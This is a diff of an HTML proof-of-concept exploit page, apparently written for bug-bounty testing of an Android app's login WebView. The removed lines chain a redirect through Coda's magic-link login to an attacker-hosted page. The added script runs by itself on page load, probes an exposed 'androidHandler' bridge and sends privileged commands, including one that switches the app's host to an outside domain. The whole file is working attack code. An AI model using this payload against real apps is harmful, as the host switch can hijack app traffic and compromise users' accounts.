@@ -1,13 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-        // Redirect to Coda first, then back to exploit
-        window.location.href = 'https://coda.io/auth/api/magicLinkLogin?redirect=' + 
-                              encodeURIComponent('https://keylorx.github.io/real-exploit.html');
-    </script>
+    <title>Login Response Exploit</title>
 </head>
 <body>
-    Redirecting to Coda...
+    <h1>Testing LoginResponseActivity Bypass</h1>
+    
+    <script>
+        function testExploit() {
+            console.log("Testing androidHandler access...");
+            
+            if (typeof androidHandler !== 'undefined') {
+                alert('🚨 VULNERABLE: androidHandler accessible via LoginResponseActivity!');
+                
+                // Try privileged actions
+                try {
+                    // Test host change
+                    androidHandler.postMessage(JSON.stringify({
+                        "action": "changeHost",
+                        "newHost": "https://keylorx.github.io"
+                    }));
+                    
+                    // Test notification access
+                    androidHandler.postMessage(JSON.stringify({
+                        "action": "navigateToNotificationSettings" 
+                    }));
+                    
+                    document.body.innerHTML += '<p style="color:red">✅ Exploit successful! Interface accessible.</p>';
+                    
+                } catch(e) {
+                    document.body.innerHTML += '<p>Error: ' + e + '</p>';
+                }
+            } else {
+                document.body.innerHTML += '<p>androidHandler not found</p>';
+            }
+        }
+        
+        // Auto-test
+        setTimeout(testExploit, 1000);
+    </script>
 </body>
 </html>
